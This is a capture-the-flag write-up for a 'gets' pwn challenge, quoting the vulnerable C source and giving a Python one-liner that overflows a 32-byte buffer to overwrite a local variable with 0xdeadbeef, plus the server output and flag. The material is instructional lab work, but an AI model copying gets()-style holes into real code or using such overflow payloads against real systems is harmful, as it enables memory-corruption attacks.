## Problem ##

My favorite libc function is gets. I am very confident in its security. Connect with

`nc gets.litctf.live 1337`

## Solution ##

Along with the binary we are provided with the source code in `gets.c`:

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	setbuf(stdout, 0x0);
	setbuf(stderr, 0x0);

	puts("Gets is very secure. You may see other sources tell you otherwise, but they are wrong.");
	puts("Geeksforgeeks says gets is insecure. G4g also says graph coloring can be solved in O(n).");
	puts("Wikipedia says gets is insecure. Anyone can write anything on wikipedia, it is unreliable.");
	puts("The linux docs say gets is insecure. No one reads the linux docs except stuck up nerds.");
	puts("My compiler warned me gets is insecure. My compiler also can't add semicolons automatically");
	puts("Hopefully you can see that gets is in fact secure, and all who tell you otherwise are lying.\n");

	puts("Are you starting to understand?");

	long debug = 0;
	char buf[0x20];
	gets(buf);

	if(strcmp(buf, "Yes") == 0){
		puts("I'm glad you understand.");
		if(debug == 0xdeadbeef){
			FILE *f = fopen("flag.txt","r");
			if(f == NULL){
				puts("Something is wrong. Please contact Rythm.");
				exit(1);
			}

			fgets(buf, 0x20, f);

			puts("Debug info:");
			puts(buf);
		}
	}else{
		puts("Think Mark, think! Gets is secure!");
	}

	return 0;
}
```

My thought process here is that first we want to enter "Yes" in order to get past the first `strcmp`. We then have a length 32 (i.e. 0x20 in hex) buffer to overflow, which we can do because [gets is vulnerable to buffer overflow](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351).

We can then terminate the string with a null byte (that is, \x00).

We then want to overwrite the `debug` parameter, currently set to `0`, with `0xdeadbeef` in order to get past the second `if` statement and obtain the flag on the remote server. With a couple attempts I determined that we needed to have 36 filler characters before overwriting the `debug` variable, which is 4 more than the size of the buffer.

We can build a one-liner as follows to get the flag:

```console
root@osboxes:~/Downloads/gets_pwn# python -c 'from pwn import *; print "Yes\x00" + "A"*36 + p32(0xdeadbeef)' | nc gets.litctf.live 1337
== proof-of-work: disabled ==
Gets is very secure. You may see other sources tell you otherwise, but they are wrong.
Geeksforgeeks says gets is insecure. G4g also says graph coloring can be solved in O(n).
Wikipedia says gets is insecure. Anyone can write anything on wikipedia, it is unreliable.
The linux docs say gets is insecure. No one reads the linux docs except stuck up nerds.
My compiler warned me gets is insecure. My compiler also can't add semicolons automatically
Hopefully you can see that gets is in fact secure, and all who tell you otherwise are lying.

Are you starting to understand?
I'm glad you understand.
Debug info:
flag{d0_y0u_g3ts_1t}
```

Flag is **flag{d0_y0u_g3ts_1t}**

